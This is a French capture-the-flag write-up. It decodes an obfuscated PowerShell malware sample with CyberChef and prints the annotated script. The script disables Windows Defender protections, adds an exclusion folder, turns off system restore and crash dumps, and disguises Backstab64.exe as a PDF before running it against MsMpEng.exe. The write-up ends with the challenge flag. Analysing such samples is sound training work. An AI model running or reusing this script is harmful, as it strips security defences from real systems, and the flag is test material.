# Petite Sieste - Partie 1

![Brief](images/sieste1.png)

# Writeup

Le fichier fourni est un script PowerShell enregistré au format texte (sleep.txt).

Voici un aperçu de celui-ci :

![apercu](images/apercusieste.png)

L’obfuscation repose principalement sur l’utilisation de chaînes encodées en Base64, décodées dynamiquement à l’aide des fonctions PowerShell `FromBase64String` et `GetString`.

Ces chaînes peuvent être décodées avec [Cyberchef](https://gchq.github.io/CyberChef/) :

![dcode](images/chainesdcode.png)

Voici le script décodé et annoté :

```powershell
$TyYazJIJJi = gci -Name # liste les dossiers présents dans C:\Users

for ($VHUdVhOLIc = 0; $VHUdVhOLIc -lt (($TyYazJIJJi.Length) - 1); $VHUdVhOLIc = $VHUdVhOLIc + 1) # parcours les profils utilisateurs
{
    if ($TyYazJIJJi[$VHUdVhOLIc].Equals("Public"))
    {
        pass
    }
    else
    {
        $kZEhiHPWvPyI_path = "C:\Users\" + $TyYazJIJJi[$VHUdVhOLIc] # sélectionne un profil utilisateur valide
    }
}

ni -Path ($kZEhiHPWvPyI_path + "\Documents") -Name "Documentation" -ItemType "Directory" # crée un faux dossier dans Documents qui peut paraître légitime pour y cacher le malware

Add-MpPreference -ExclusionPath ($kZEhiHPWvPyI_path + "\Documents\Documentation\")

Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true # Désactive les protections Windows Defender

Disable-ComputerRestore -Drive "C:\"

sp -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0

Rename-Item -Path ($kZEhiHPWvPyI_path + "\Backstab64.exe") -NewName "Guide_Utilisateur_v03.pdf.exe" # renomme le binaire malveillant initial en un faux "document pdf" 

for ($vbVfRDvzBTIBM = 0; $vbVfRDvzBTIBM -lt 100; $vbVfRDvzBTIBM = $vbVfRDvzBTIBM + 1) # boucle d'éxécution répetée du malware - usurpe un process windows defender (MsMpEng.exe)
{
    ./Guide_Utilisateur_v03.pdf.exe -n MsMpEng.exe -k
    Start-Sleep -Seconds 8
}
```
La ligne utile pour cette première partie est celle-ci  :

```
Rename-Item -Path ($kZEhiHPWvPyI_path + "\Backstab64.exe") -NewName "Guide_Utilisateur_v03.pdf.exe" # renomme le binaire malveillant initial en un faux "document pdf" `
```

Elle indique le nom initial du malware et permet de reconstruire le flag : 

```
FLAG{backstab64.exe}
```